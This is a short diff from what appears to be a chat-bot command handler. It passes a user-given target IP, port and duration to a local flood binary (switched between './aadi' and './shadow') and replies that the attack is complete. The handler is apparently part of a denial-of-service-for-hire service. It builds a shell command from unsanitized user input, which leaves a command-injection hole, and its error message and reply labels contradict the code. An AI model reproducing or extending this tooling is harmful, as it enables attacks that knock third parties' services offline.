@@ -231,10 +231,10 @@ def handle_aadi(message):
             if time > 181:
                 response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/shadow', target, port, time)
+                record_command_logs(user_id, '/aadi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./aadi {target} {port} {time} 75"
+                full_command = f"./shadow {target} {port} {time} 75"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- Target: {target} Port: {port} Port: {time}"
         else:
